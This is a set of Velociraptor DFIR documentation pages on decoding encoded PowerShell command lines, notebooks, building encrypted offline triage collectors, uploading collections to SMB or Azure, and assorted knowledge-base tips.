This means that typical process execution logs will display commands such as

```sh
powershell -encodedCommand ZABpAHIAIAAiAGMAOgBcAHAAcgBvAGcAcgBhAG0AIABmAGkAbABlAHMAIgAgAA==
```

Making it difficult to visually inspect the commandline.

In this example we wish to decode such a command on the server to
present a small subset of decoded powershell command lines.

{{% notice note %}}
 Alternatively we can decode the commandline on the endpoint itself and forward the enriched event (including the decoded command line)
{{% /notice %}}

Consider the `Server.Powershell.EncodedCommand` artifact:

```vql
SELECT ClientId, ParentInfo, CommandLine, Timestamp, utf16(
   string=base64decode(
      string=parse_string_with_regex(
         string=CommandLine,
         regex='-((?i)(en|enc|encode|encodedCommand)) (?P<Encoded>[^ ]+)'
      ).Encoded)) AS Script
FROM watch_monitoring(artifact='Windows.Events.ProcessCreation')
WHERE CommandLine =~ '-(en|enc|encode|encodedCommand)'
```

The artifact watched for any rows returns from the client artifact
`Windows.Events.ProcessCreation` (originating from any client), and
applies a regular expression filter to the command line to identify
the encoded command lines. The artifact then extract the base64 blob
and decodes it.

Here is a high level overview diagram.

![Enriching Client Events](enriching_client_events.png)

1. First we configure Velociraptor to collect the
   `Windows.Events.ProcessCreation` from all clients (using the Client
   Events configuration screen). These events will be collected from
   all clients and written to the server.

2. Next we configure a server artifact (from the `Server Events`
   screen) to monitor all client events and identify the encoded
   powershell commands.

3. The encoded PowerShell commands will be generated as rows from the
   `Server.Powershell.EncodedCommand` server artifact.


Now we are able to decode encoded powershell command lines

![Decoding powershell commands](decoded_powershell.png)

---END OF FILE---

======
FILE: /content/docs/notebooks/_index.md
======
---
title: "Notebooks"
date: 2021-06-11T15:32:04Z
draft: false
weight: 35
aliases:
  - "/docs/vql/notebooks/"
---

Notebooks are interactive collaborative documents which can interleave
markdown and VQL queries in to create an interactive report. Notebooks
are typically used to track and post process one or more hunts or
collaborate on an investigation.

Let's create a notebook to see the feature at work.

1. Start the Velociraptor GUI. You can do so easily by running
   `velociraptor.exe gui`. This will create a new server configuration
   and start a new server on the local machine. It will also start a
   local client communicating with the server.

![velociraptor GUI](image5.png)

2. Select Notebooks <i class="fas fa-book"></i> from the sidebar menu then "Add Notebook" <i class="fas fa-plus"></i>.

3. Give the notebook a name and a description and submit. The new
   notebook is created.

![New Notebook](new_notebook.png)

{{% notice tip "Notebook cells and focus" %}}

A notebook consists of cells which may be edited. However, when not in
focus a cell has no decorations in order to appear as a seamless part
of a larger document. You have to click the cell into focus to be able
to see it's controls.

{{% /notice %}}

4. Click on the cell to give it focus and the cell control toolbar
   will be shown, from here click the `Edit Cell` <i class="fas
   fa-pencil-alt"></i> button to edit the cell contents.

![Editing a cell](image13.png)

There are two types of cells: A `Markdown` cell receives markdown text
and renders HTML while a `VQL` cell can receive VQL queries. The cell
type is shown on the right hand side of the cell toolbar. You may
change cells from one type to the other at any time.

5. Lets add a new cell to the notebook. Click the `Add Cell` button <i
   class="fas fa-plus"></i> and a pull down menu appears offering the
   type of Cell that can be added. For now, select a `VQL` cell.

![New Notebook](new_cell.png)

After clicking the `Edit Cell` button, you can type VQL directory into
the cell. As you type, the GUI offers context sensitive suggestions
about what possible completions can appear at the cursor. Typing "?"
will show all suggestions possible.

{{% notice note "VQL suggestions are context sensitive" %}}

Suggestions are context sensitive, so VQL plugins which can only
appear after a `FROM` clause will only be suggested when the cursor
appears are FROM.

{{% /notice %}}

![Adding a new cell](add_cell.png)

Lets type the following VQL query into the VQL cell.

```sql
SELECT * FROM info()
```

![Basic query](basic.png)


{{% notice tip "Viewing the notebook in full screen" %}}

The notebook may be switched into full screen to better emulate a full
notebook. With this setting, the notebook takes up the entire width of
the screen. You can switch back to the pane view by clicking on the
collapse button at the top right of the screen.

![Full screen notebook](fullscreen.png)

{{% /notice %}}


## Hunt and Flow Notebooks

Notebooks are an excellent medium to run arbitrary VQL queries. Much
of the time, these queries are used to post process the results from
collections or hunts.

Therefore Velociraptor automatically creates a `hunt notebook` for
each hunt and a `flow notebook` for each collection. Let's see this
feature in action. I will collect the `Windows.Timeline.Prefetch`
artifact that will build a timeline of the prefetch files on the
endpoint.

## Sharing Notebooks

By default, notebooks are private to the user who created them.
When creating or editing a notebook, you can choose to share it with
all users by clicking the Public check box. You can also share it with
only some users by selecting their names in the Collaborators field.

![Sharing a notebook](notebook_sharing.png)

{{% notice note "Accessing Data in Private Notebooks" %}}
Users can only view notebooks that they own or share.
Other notebooks cannot be accessed from the list view
or via direct link. However, the data within notebooks is still available
to all users. For example, any notebook editor can build or view a
[timeline]({{< ref "/blog/2021/2021-09-07-release-notes-0.6.1/#timelines" >}})
from private notebook cells if they know the notebook and cell IDs. This can
be useful for providing your team with data views that are sourced from more
complex queries maintained in a private notebook.
{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/api/_index.md
======
---
title: "The API"
date: 2021-06-27T04:29:34Z
draft: true
weight: 70
---

---END OF FILE---

======
FILE: /content/docs/offline_triage/_index.md
======
---
title: "Triage and acquisition"
date: 2021-06-27T04:31:24Z
draft: false
weight: 50
---

In DFIR Triaging means to quickly collect information about the system
in order to establish its potential relevance to a forensic
investigation.

While many think of triage as collecting files (perhaps as an
alternative to full disk acquisition), in Velociraptor, there is no
real difference between collecting files or other non-volatile
artifacts: Everything that Velociraptor collects is just a VQL
Artifact.

We like to think of triage as simply capturing machine state - where
the state may be bulk files (like the `$MFT` or registry hives) or any
other volatile data, such as process information, network connections
etc.

### Collecting files

Being able to efficiently and quickly collect and preserve evidence is
important for being able to capture machine state at a point in
time. It is also useful to be able to use these collected files with
other forensic tools that might be able to handle the file formats
involved.

One of the most commonly used artifact is the
`Windows.KapeFiles.Targets` artifact. This artifact is automatically
built from the open source
[KapeFiles](https://github.com/EricZimmerman/KapeFiles) repository.

While originally developed to support the non-opensource Kape tool,
this repository contains many types of files which might be relevant
to collect in a triage scenario. Each Kape "Target" is essentially a
glob expression with a name.

In Velociraptor `Windows.KapeFiles.Targets` is the most popular
artifact for mass file collection.  It does no analysis but simply
collects a bunch of files based on the targets specified.

Start by selecting the artifact from the "New Collection" wizard

![The Windows.KapeFiles.Targets artifact](image2.png)

Next we need to select the "Targets" in the "Configure Parameters"
step. Many targets are simply collections of other targets. For
example the `_BasicCollection` target automatically includes a number
of other useful targets.

![Selecting recursive targets](image7.png)

The `Windows.KapeFiles.Targets` artifact can transfer a large quantity
of data from the endpoints, and take a long time to run. We therefore
often need to update the resource control of the collection.

![Specifying a maximum upload limit](image6.png)

Once the collection is launched, we can monitor progress in the "Artifact Collection" tab.

![Monitoring collection progress](image4.png)

{{% notice note "Note about large file collections" %}}

Velociraptor is very careful about the performance and resource impact
on endpoints. When collecting many files if it is often hard to
determine in advance how much data will be collected or how long it
will take. For safety, Velociraptor allows limits to be set after
which the collection is cancelled. You can also interactively cancel
the collection by clicking the "Stop" button.

Be aware that a lot of data can be collected which might fill up the
VM disk.

> Math is a harsh mistress:
> Collecting 100Mb  from 10,000 endpoints = 1Tb
>
> Note that typically $MFT is around 300-400Mb so collecting the $MFT
> from many endpoints is going to be huge!

![Collections are automatically cancelled when they reach the limit](image5.png)

{{% /notice %}}

## Offline collections

We have seen previously how to collect many files using the
`Windows.KapeFiles.Targets` artifact in the usual client/server
mode. But what if we are unable to deploy Velociraptor on a new
network in client/server mode? With Velociraptor not installed on the
endpoint, how shall we collect and triage artifacts?

Velociraptor is just a VQL engine!  All we need is Velociraptor to be
able to collect the VQL artifacts into a file, and then we can
transport the file ourselves for analysis.  Velociraptor does not
really need a server...

Often we rely of an external helper (such as a local admin) to
actually perform the collection for us. However, these helpers are
often not DFIR experts. We would like to provide them with a solution
that performs the required collection with minimal intervention - even
to the point where they do not need to type any command line
arguments.

The `Offline collector` aims to solve this problem. Velociraptor
allows the user to build a specially configured binary (which is
actually just a preconfigured Velociraptor binary itself) that will
automatically collect the artifacts we need.

Velociraptor allow us to build such a collector with the GUI using an
intuitive process.

![Creating a new Offline Collector](image3.svg)

Select the offline collector builder from the `Server Artifacts`
page. The artifacts selection page and the parameters page are exactly
the same as previously shown.

![Offline Collector artifacts selection](image16.png)

![Offline Collector parameters configuration](image17.png)

Next select the collector configuration page.

![Offline Collector configuration](offline1.png)

Here we get to choose what kind of collector we would like:

* Target Operating System: This specifies the specific version of the
  Velociraptor binary that will be packed.

* Encryption: It is possible to specify a scheme to encrypt the zip
  file that will be created. Read more about this below.

* Collection Type: This controls where the collection is stored.

    * Zip Archive: The collection will be stored in a zip file in the
      same directory the collector is launched from.

    * Google Cloud Bucket: The zip file will be uploaded to a cloud
      bucket. When selecting this you can provide GCP credentials to control
      the upload bucket.

    * AWS Bucket: The zip file will be uploaded to a cloud
      bucket. When selecting this you can provide AWS credentials and
      details to control the upload bucket.

    * SFTP: This allows the collector to upload the file to an SFTP
      server using a private key.

The **Offline Collector Builder** is simply a GUI wrapper around the
`Server.Utils.CreateCollector` server artifact. Once it is collected,
the artifact will automatically upload the pre-configured collector it
created into the collection and the file will be available for
download from the "Uploads" tab. Simply click on the link to get the
collector.

![Retrieving the Offline Collector binary](image13.svg)

Once the collector is run without command line arguments, the
collection will automatically start. No need for the user to enter
command line parameters, although they do need to be running in an
elevated administrator shell.

![Running the Offline Collector in the console](image14.png)

The collector creates a zip file containing the collected files as
well as an optional report.

![Viewing the Offline Collector in the console](image29.png)

### Encrypting the offline collection

The offline collector can capture a lot of privacy and security
sensitive information. Typically we want to produce an encrypted Zip
file so that it can not be extracted by anyone other than authorized
users.

The offline collector supports a number of encryption schemes, but
they all produce an encrypted zip file. While the ZIP encryption
format uses `AES` to encrypt the contents of files with a password, file
names and metadata are not encrypted. This can lead to a lot of
information leakage by simply listing the archive (which does not
require a password).

Velociraptor solves this problem by compressing the files inside
another ZIP file named `data.zip` and then encrypting the content of
that file. Therefore when listing an encrypted file we see only a
metadata file and `data.zip`

Velociraptor supports a number of ways to derive the password with
which to protect the collection:

1. The `Password` method specifies a password in the embedded
   configuration file. This password is passed directly to the ZIP
   library to encrypt the file.

   While simple to use this scheme is not recommended as the password
   is stored in clear text inside the offline collector and can be
   easily extracted (by running `Collector.exe config show`)

2. The `X509` method is the recommended method to use in all
   cases. This scheme embeds the Velociraptor server's public
   certificate in the offline collector. During collection, a random
   password is generated which is then encrypted using the embedded
   Velociraptor certificate and stored in the container inside a
   metadata file.

   After the password is used to encrypt the container, it is
   discarded. The only way to recover the password is to decrypt it
   using the server's private key. This way if the collector binary or
   the collection are compromised - it is impossible to recover the
   password without the server's configuration file (that contains the
   private key).

   If the `X509` method is used, the collected ZIP files will be
   decrypted automatically and transparently when they are imported
   into the same server that produced the offline collector.

### The Generic offline collector

Normally the Velociraptor offline collector builder computes a preset
configuration file and embeds it inside the regular Velociraptor
binary for ease of use. However this can cause some problems in some
cases:

1. By modifying the official Velociraptor binary, the Authenticode
   signature is invalidated. Therefore the offline collector will need
   to be re-signed to pass many integrity checks.
2. The amount of space within the binary reserved for the offline
   collector is limited. This means that very large artifacts will
   cause the space to be exceeded.
3. We have also seen recent MacOS systems refuse to run a binary that
   has been modified. Therefore regular offline collector packing does
   not work on recent MacOS versions.

In recent versions of Velociraptor we now offer a new type of
collector called the "Generic collector".

![](generic_collector.png)

This will embed the configuration into a shell script instead of the
Velociraptor binary. You can then launch the offline collector using the
unmodified official binary by specifying the `--embedded_config` flag:

{{< tabs >}}
{{% tab name="macOS" %}}
```shell
./velociraptor-darwin-amd64 -- --embedded_config Collector_velociraptor-collector
```
{{% /tab %}}
{{% tab name="Linux" %}}
```shell
./velociraptor-linux-amd64 -- --embedded_config Collector_velociraptor-collector
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor-windows-amd64.exe -- --embedded_config Collector_velociraptor-collector
```
{{% /tab %}}
{{< /tabs >}}


![](generic_collector_running.png)

While the method is required for MacOS, it can also be used for
Windows in order to preserve the binary signature or accommodate
larger artifacts.

### Building an offline collector on the command line

The easiest way of building an offline collector is using the GUI as
described above. However, for cases where automation is required, it
is also possible to build an offline collector using the commandline
only.

This works by writing settings into a `Spec File`. Velociraptor uses
this file to prepare the offline collector automatically. To obtain
the initial template for the file run the following command:

```sh
$ mkdir /tmp/datastore/
$ ./velociraptor-v0.74.1-linux-amd64 collector --datastore /tmp/datastore/ > /tmp/datastore/spec.yaml
velociraptor-v0.74.1-linux-amd64: error: collector: No Spec file provided
```

The first command prepares a temporary datastore location (this is
similar to the `velociraptor gui` command which builds an entire
deployment in that directory).

Because we have not provided any `Spec File` parameter, Velociraptor
will print a template to the output which we redirect to a file.

Next edit the spec file (which is heavily documented). Most options
are similar to the ones presented in the GUI builder.

To build the collector, run the command with the generated `spec
file`.

```sh
$ ./velociraptor-v0.74.1-linux-amd64 collector --datastore /tmp/datastore/ /tmp/datastore/spec.yaml
...
Running query LET _ <= SELECT name FROM artifact_definitions()
[INFO] 2024-07-10T09:12:28Z Compiled all artifacts.
[]Running query LET Spec <= parse_yaml(filename=SPECFILE)
[]Running query LET _K = SELECT _key FROM items(item=Spec.Artifacts)
[]Running query SELECT * FROM Artifact.Server.Utils.CreateCollector(OS=Spec.OS, artifacts=serialize(item=_K._key), parameters=serialize(item=Spec.Artifacts), target=Spec.Target, target_args=Spec.TargetArgs, encryption_scheme=Spec.EncryptionScheme, encryption_args=Spec.EncryptionArgs, opt_verbose=Spec.OptVerbose, opt_banner=Spec.OptBanner, opt_prompt=Spec.OptPrompt, opt_admin=Spec.OptAdmin, opt_tempdir=Spec.OptTempdir, opt_level=Spec.OptLevel, opt_filename_template=Spec.OptFilenameTemplate, opt_collector_filename=Spec.OptCollectorTemplate, opt_format=Spec.OptFormat, opt_output_directory=Spec.OptOutputDirectory, opt_cpu_limit=Spec.OptCpuLimit, opt_progress_timeout=Spec.OptProgressTimeout, opt_timeout=Spec.OptTimeout, opt_version=Spec.OptVersion)
[INFO] 2024-07-10T09:12:28Z Downloading tool VelociraptorWindows FROM https://github.com/Velocidex/velociraptor/releases/download/v0.72/velociraptor-v0.74.1-windows-amd64.exe
client_repack: Will Repack the Velociraptor binary with 5733 bytes of config
Adding binary Autorun_386
Adding binary Autorun_amd64
Uploaded /tmp/datastore/Collector_velociraptor-v0.74.1-windows-amd64.exe (60829135 bytes)
[
 {
   "Repacked": {
      "Path": "/tmp/datastore/Collector_velociraptor-v0.74.1-windows-amd64.exe",
      "Size": 60829135,
      "sha256": "968b8802c10faeaec2a86b9295f66aeee45b79e30a3028be2162a8718b4a98e9",
      "md5": "3c9375283665d68817008d7a8f232796",
      "Components": [
         "Collector_velociraptor-v0.74.1-windows-amd64.exe"
      ]
   },
   "_Source": "Server.Utils.CreateCollector"
 }
]
```

As the output shows, Velociraptor will automatically download any
required binaries for inclusion in the collector. External binaries
will be cached in the datastore so the next time the command is run it
will just use those efficiently.

As mentioned previously it is recommended to use the `X509` encryption
method for the offline collector. Simply change the following part of
the spec file:

```yaml
EncryptionScheme: X509
```

The `velociraptor collector` command is similar to the `velociraptor
gui` command in using a directory on the disk to create a full
deployment with a `server.config.yaml` containing keys. When using the
`X509` command, the `server.config.yaml` file will be placed in that
datastore directory.

If you want to give other people the ability to decrypt the collection
you can share that `server.config.yaml` file with them and allow them
to unpack using:

```bash
velociraptor --config server.config.yaml unzip collection.zip --dump_dir /output/dir
```

### Include third party binaries

Sometimes we want to collect the output from other third party
executables. It would be nice to be able to package them together with
Velociraptor and include their output in the collection file.

Velociraptor fully supports incorporating external tools. When
creating the offline collection, Velociraptor will automatically pack
any third party binaries it needs to collect the artifacts specified.

### Collecting across the network

By having a single executable collector, all we need is to run it
remotely. We can use another EDR solution that allows remote execution
if available. Alternatively, we can use Window's own remote management
mechanisms (such as PsExec or WinRM) to deploy our binary across the
network.  Simply, copy our collector binary across the network to C$
share on the remote system and use, e.g. `wmic` to launch our binary
on the remote host.

![Collecting across the network](image45.png)

## Importing collections into the GUI

We can use the offline collector to fetch multiple artifacts from the
endpoint. The results consist of bulk data as well as JSON file
containing the result of any artifacts collected.

You can re-import these collection into the GUI so you can use the
same notebook port processing techniques on the data. It also allows
you to keep the results from several offline collections within the
same host record in the Velociraptor GUI.

{{% notice tip "Offline Collectors are Out-Of-Band Clients!" %}}

An offline collector is essentially an out-of-band client. Instead of the client
connecting over the internet, the data is delivered via sneakernet! The data is
then imported into the server which creates a normal client record and
associated collections. The data can then be queried as with any other client.

{{% /notice %}}

Importing an offline collection can be done via the
`Server.Utils.ImportCollection` artifact. This artifact will inspect
the zip file from a path specified on the server and import it as a
new collection (with new collection id) into either a specified client
or a new randomly generated client.

![Importing Offline Collector collections](image48.png)

{{% notice tip "Copying the collections to the server" %}}

Offline collections are typically very large, this is why we do not
have a GUI facility to upload the collection zip file into the
server. You will need to use an appropriate transfer mechanism (such
as SFTP or SCP) to upload to the server itself.

{{% /notice %}}

# Local collection considerations

Local collection can be done well without a server and permanent agent
installed. A disadvantage is that we do not get feedback of how the
collection is going and how many resources are consumed.

Offline collections are typically planned in advance and it is a bit
more difficult to pivot and dig deeper based on analysis results to
search for more results. For this reason offline collections tend to
err on the side of collecting more data rather than being more
targeted and focused on answering the investigative questions.

---END OF FILE---

======
FILE: /content/docs/offline_triage/remote_uploads/_index.md
======
---
title: "Remote Uploads"
date: 2023-04-02T04:31:24Z
draft: false
weight: 45
---

By default, Velociraptor's offline collector will create a ZIP file
containing all the collected files and artifacts. However, this zip
file is normally large and we may not want to rely on the person
collecting the data to handle sending us the archive file. Instead,
Velociraptor's offline collector can upload the collected archive to a
remote location automatically when the collection is done.

![The Offline Collector supports many types of uploads](offline_collection_types.png)

In this page we discuss how to use some of these options. The correct
option to choose in any specific scenario depends on many factors,
such as network access, cost and availability.

## Encrypting the collection

Velociraptor's artifact collections typically include a lot of
potentially sensitive information, such as logs, user activity etc. By
default the archive produced is a simple ZIP file, but we recommend
the Zip file be protected with some encryption.

![Output container can be encrypted using a number of schemes](encrytion_schemes.png)

### Password encryption

Velociraptor can use a ZIP password to encrypt the collected
data. Unfortunately the ZIP encryption standard does not cover the
Central Directory making it possible to see file names, sizes and
other metadata, even if the file content itself is encrypted.

To mitigate this risk, Velociraptor will create an embedded ZIP file
inside an encrypted container zip file with a fixed name (called
`data.zip`). This way the file metadata is not exposed without needing
to decrypt the embedded ZIP file.

{{% notice warning "Password encrypted ZIP files" %}}

If using a fixed password to encrypt the collection, the password
needs to be embedded within the collector itself. It is easy to
extract the collector configuration (simply by running `collector.exe
config show`) and therefore the fixed password can be easily
extracted.

We recommend an asymmetric scheme to be used in practice.

{{% /notice %}}

### X509 certificate based encryption

To avoid needing to embed the password in the collector binary,
Velociraptor offers an X509 scheme. In this scheme the Velociraptor
server embeds its public certificate in the collector binary.

The offline collector then generates a random password to encrypt the
collection archive with, and in turn encrypts this password with the
embedded public key certificate. This means **only** the server with
the corresponding private key is able to decrypt the zip file.

To use this option, simply select the `X509 Certificate` option for
the collector and leave the `Public Key/Cert` text box blank. The
produced collector will automatically encrypt the container.

![Offline collector encrypting the output container](encrypting_container.png)

The produced collection contains the encrypted data and the metadata
file that can be used to decrypt the file given the correct private
key.

![The contents of the encrypted collection file](encrypted_file_content.png)

To extract the X509 encrypted container you can use Velociraptor's
`unzip` command to decrypt the container automatically. You will need
to provide Velociraptor with the correct config file for the server
that created the collector in the first place. Velociraptor will use
the server's private key to decrypt the container transparently.

```
velociraptor.exe --config server.config.yaml unzip Collection-WIN-ADLPBK6BTV0-2023-04-09T07_26_25-07_00.zip
```

![Inspecting the encrypted container](extracting_encrypted_files.png)

Alternatively, you can import the encrypted collection to the
Velociraptor server using the `Server.Utils.ImportCollection`
artifact.

{{% notice tip "X509 encrypted collections" %}}

Due to the ease of use and enhanced security provided by the X509
encryption scheme we recommend this to be used in most cases.

Make sure that you retain the server configuration file that was used
to create the collector in the first place! It is needed to be able to
decrypt the collections.

{{% /notice %}}

## Zip Archive

By default Velociraptor's collector will simply create a ZIP file and
leave it in the current directory.

In many scenarios, the collection is performed by a trusted agent
(such as a remote IT professional). In that case it is useful to
automatically upload the collection to a remote system.

The following sections document additional options and the best
practice of securing them.

## SMB Share

SMB is the Microsoft file sharing protocol which is a convenient
option for Windows based systems. Velociraptor supports uploading to
SMB shares since release 0.6.9.

To configure this option we need to:
1. Create a new local uploader user on one of the windows systems
   accessible to the host the collection is running on.

![Creating a local user for uploads](local_user.png)

2. Create a directory to receive the files.
3. Share the directory out to the local uploader user.

![Right click on directory and select properties/sharing tab then click the share button](sharing_directory.png)

4. Adjust directory ACLs to only permit the user to write files
   without being able to list the directory or read the files. This is
   required because the uploader user credentials must be embedded in
   the offline collector so we do not want these misused to alter any
   of the other uploads.

![Adjusting directory permissions to only provide write access](directory_permissions.png)

It is best to test the SMB configuration works as desired using the
simple VQL query in a notebook.

```vql
LET SMB_CREDENTIALS <= dict(`192.168.1.112`="uploader:test!password")

SELECT upload_smb(accessor="data",
    file="Hello world",
    name="hello.txt",
    server_address="//192.168.1.112/uploads")
FROM scope()

SELECT *
FROM glob(globs="*",
    root="//192.168.1.112/uploads",
    accessor="smb")
```

The above query:
1. Sets the global credential cache for use of SMB
2. Uploads a test file called "hello.txt" to the uploader directory
3. Attempts to list the uploads directory using the `glob` plugin.

The upload file should succeed but the `uploader` user should not be
able to list the directory.

![Testing the SMB permissions with a VQL query](testing_smb.png)

We are now ready to specify the details to the offline collection
GUI. NOTE: Usually it is better to use the IP of the server rather
than the name for improved reliability.

![Creating the SMB offline collector](creating_smb_collector.png)

## Azure Blob Storage

Velociraptor supports uploading to Azure since version 0.6.9.

Azure is a popular cloud provider by Microsoft, and this is a popular
choice for uploading collection archives from remote systems. This
choice is suitable when the system is internet connected and you do
not want to make other changes to the network (e.g. standing up an SMB
server as above).

Azure supports an authentication policy called [Shared Access
Signature
(SAS)](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview)
making it convenient and secure to provide limited access to the
a storage container. Using this method, we can embed a simple SAS URL
that provides access to upload data to the storage container without
granting the ability to download or remove any data. This is ideal for
embedding in the offline collector.

The steps required to set up Azure access are:

1. Create a storage account.
2. Create a new data storage container to receive the uploads

![Creating a new Azure Blob storage container](creating_azure_container.png)

3. Add a role assignment to allow the storage account to manage the storage

![Adding a role assignment to the storage account](azure_role_assignment.png)

3. Generate a SAS Policy URL.

![Right click on the container to generate a SAS policy](generating_sas_policy.png)

4. Create a SAS policy with only write and create access. You can
specify an appropriate expiry time for the SAS URL. After this time
the uploader will no longer work.

![SAS Policy should have only Write and Create Access](sas_policy_details.png)

5. Test the SAS URL works properly

![Test the SAS Policy by uploading a small file in the notebook](testing_sas_url.png)

6. Embed the SAS URL in the offline collector.

![Simply paste the SAS URL in the collector GUI](sas_collector.png)

---END OF FILE---

======
FILE: /content/knowledge_base/_index.md
======
---
menutitle: "Knowledge Base"
title: "Knowledge Base"
draft: false
weight: 250
pre: <i class="fas fa-brain"></i>
no_edit: true
disableToc: true
no_children: true
noDisqus: true
rss_data_file: static/kb/data.json
rss_title: Velociraptor Knowledge Base
outputs:
- html
- RSS
---

Velociraptor is a powerful but very flexible tool. Sometimes getting
up to speed with Velociraptor is challenging and sometimes it can do
things that you have never even imagined was possible!

This section of the site facilitates sharing the community's
experiences, tips and tricks for getting certain tasks done.  The key
for using this resource is asking a question: "What task are we trying
to achieve?"

Search the below questions to read a short knowledge base article of
how to answer the question.

{{% knowledge_base %}}

---END OF FILE---

======
FILE: /content/knowledge_base/tips/notebook_timeout.md
======
# How to increase notebook timeout

In the notebook, VQL queries are limited to 10 minutes. Once the timeout is expired, the query is cancelled.
Regular collections from clients also have a timeout, that timeout can be changed in the new collection wizard GUI to give the query more time.

But there is no similar control for the notebook cells. In the notebook, the time limit serves to limit server load - because the notebook queries are run on the server we don't want them to take too long or make it too easy to extend the timeout too long.

If you find that your cell query is routinely exceeding the timeout, you can use one of the following approaches:

1. Make the query more efficient - for example using multi-threaded queries or the `parallelize()` plugin.

2. Turn the query into a server artifact. Large queries are often very reusable and if you can turn it into an artifact, it might be useful again. Running a server artifact allows the timeout to be increased if needed.

3. As a last resort update the default notebook timeout in the configuration file. Find or add the section called `defaults` and add the following setting:

```yaml
Frontend:
... other settings ...
defaults:
    notebook_cell_timeout_min: 20
```

Tags: #configuration

---END OF FILE---

======
FILE: /content/knowledge_base/tips/download_password.md
======
# How do I enable password protected VFS downloads?

You can just export them from the GUI!

Set the password in your user preferences you can enable password
protected exports.

Highlight the directory you want to export.

![](01.png)

Hit the export button - this will start a server collection to take a
snapshot of the vfs - you can set any filtering globs (so for example
don't export all the files - maybe only `*.exe`).

![](02.png)

By default it just does `**` which is everything under the directory.
This makes a collection and adds a link to it.

![](03.png)

Then click that and export like any other collection.

![](04.png)

Password can be set in the user preferences (the top right tile
with the username).  This will enable the lock feature of the zip
export - make sure to click close button to save the password (instead
of just clicking outside the modal dialog).

![](05.png)


Tags: #password #download #gui

---END OF FILE---

======
FILE: /content/knowledge_base/tips/debugging_clients.md
======
# How do I debug the client while it is running?

Sometimes we collect artifacts from clients but for some reason things seem to take longer than expected. Velociraptor has mechanisms to gain visibility into how clients behave and what queries are running.

## Query logs

The first port of call is viewing the query logs in the logs tab of the relevant collection.

![Viewing the query logs](https://user-images.githubusercontent.com/3856546/159195874-ec6c8322-cb70-4254-861a-95888db94201.png)

As the query is running, it will emit a message to let us know that it is waiting for rows. We use this to determine that the query is still running on the client.

## Collecting profiles

The `Generic.Client.Profile` artifact allows us to collect internal state of the client. Simply collect this from the client, while other queries are running

![Client Profile](https://user-images.githubusercontent.com/3856546/159196011-28808471-4111-42ba-bfd3-819381bdf596.png)

The most common thing to collect include:

1. The Goroutine dump shows a stack trace of all currently running goroutines (similar to threads). This helps us understand if there is a deadlock or another bug.
2. The logs delivers a recent dump of client logs. Normally the client does **not** write it's logs to file to avoid information leakage issues. You can see the logs on the console by running the client with the `-v` flag, but each client also keeps the last 1000 messages in a memory buffer so they can be available if needed. This option sends the recent logs to the server.
3. Query logs are a recent log of VQL queries running on the endpoint. This gives us an idea of exactly what the client is doing.
4. Metrics are internal program counters that provide visibility of performance related items.

When asking for help on Discord or our mailing list, we will often ask for the profiles collected from the client (or server). At a minimum we will need the above items to diagnose any issues.

{{% notice tip %}}

The nice thing about collecting profiles is that the client does **not** need to be restarted and we do not need to run a special debug build - all clients are capable of collecting profile information at any time.

{{% /notice %}}

### References

You can read more about [profiling Velociraptor here](https://docs.velociraptor.app/blog/2020/2020-08-16-profiling-the-beast-58913437fd16/).

Tags: #deployment, #debugging

---END OF FILE---

======
FILE: /content/knowledge_base/tips/automate_offline_collector.md
======
# How can I automate the creation of the offline collector?

The Velociraptor Offline collector is a [pre-configured triage and
acquisition tool]({{<ref "/docs/offline_triage/#offline-collections" >}}).

Velociraptor features a convenient GUI to allow creating the offline
collector's including building the configuration file and embedding it
inside the collector.

But what if we need to automate the creation of the collector? While a
GUI is nice it can be made much more efficient to automate the
collector.

When building the collector using the GUI you might notice that the
GUI simply preconfigured and launches a new server artifact and the
server simply collects that.

![The Create Offline Collector artifact](create_collector.png)


You can actually collect the same artifact using the command line (on
the server) or using the API (from anywhere). Here is an example with
PowerShell (assuming the server is running on Windows):

```powershell
velociraptor.exe --config server.config.yaml -v artifacts collect
   Server.Utils.CreateCollector
   --args OS=Windows
   --args artifacts='["""Generic.System.Pstree"""]'
   --args parameters='{"""Generic.System.Pstree""":{}}'
   --args target=ZIP
   --args opt_admin=N
   --args opt_prompt=N
   --output collector.zip
```

This command will create a new offline collector binary and store it
inside the file `collector.zip`

We can now extract the executable from the ZIP file (using powershell)

{{% notice note "Escaping quotes" %}}

Note that running this in powershell requires quotes to be escaped in
the powershell specific way. Usually it means expanding double quotes
(`"`) into 3 double quotes (`"""`)

https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_quoting_rules

{{% /notice %}}

## A collector creation script

There is a simple script that makes it easier to create the collector without a GUI here
https://github.com/Velocidex/velociraptor/tree/master/docs/offline_collector

This script uses a specification file to avoid the need to escaping on
the command line. The specification file is simply the same as what
will be generated by the GUI (So you can check the output of the GUI
for the ultimate reference what each variable means).

To run the script simply create a new directory and point the script
to the Velociraptor binary for your platform and the spec file.

The script will create a small Velociraptor deployment in the current
directory and automatically download any third party tools needed.

The script should work with earlier versions but was tested for
Release 0.7.0 onwards.

Tags: #configuration #collector

---END OF FILE---

======
FILE: /content/knowledge_base/tips/registry_finder.md
======
# How do I search for registry keys

To search the registry simply use the "registry" accessor with the `Windows.Search.FileFinder` artifact.

This works because Velociraptor can glob the registry as if it were a filesystem (See [Filesystem Accessors]({{% ref "/docs/forensic/filesystem/#filesystem-accessors" %}})

![Searching the registry](https://user-images.githubusercontent.com/3856546/165133750-a694844a-5bb5-44bc-94a8-fd715a6efe4a.png)


Tags: #forensics #searching

---END OF FILE---

======
FILE: /content/knowledge_base/tips/favorites.md
======
# How can I save my favorite collections for the future?

Sometimes we tend to collect the same set of artifacts together,
possibly with some specific parameters. It gets tedious to constantly
reconfigure the `New Collection` interface with the same set of
artifacts.

This where the `favorites` feature comes in. We can save existing
collections including the artifacts collected and their
parameters. Then in future we just need to restore our collections
from our favorites.

![Saving a collection as a favorite](fav.png)


The favorite can be restored in future by simply adding a new
collection, clicking the favorite button and searching for it.

![Restoring a favorite collection](fav2.png)

## Creating favorites programmatically

Favorites are stored into the user's profile, since each user might
have a different set of artifacts they normally use.

It is possible however to create favorites using VQL with the [favorites_save()]({{% ref "/vql_reference/server/favorites_save/" %}}) function:

```vql
SELECT favorites_save(type="CLIENT", name="MyFavorite",
specs='''
[{"artifact":"Windows.Search.FileFinder",
  "parameters": {
    "env": [{
        "key": "SearchFilesGlob",
        "value": "HKEY_USERS/*/Software/Sysinternals/*/*"
    }, {
        "key": "Accessor",
        "value": "registry"
    }]}}]''')
FROM scope()
```

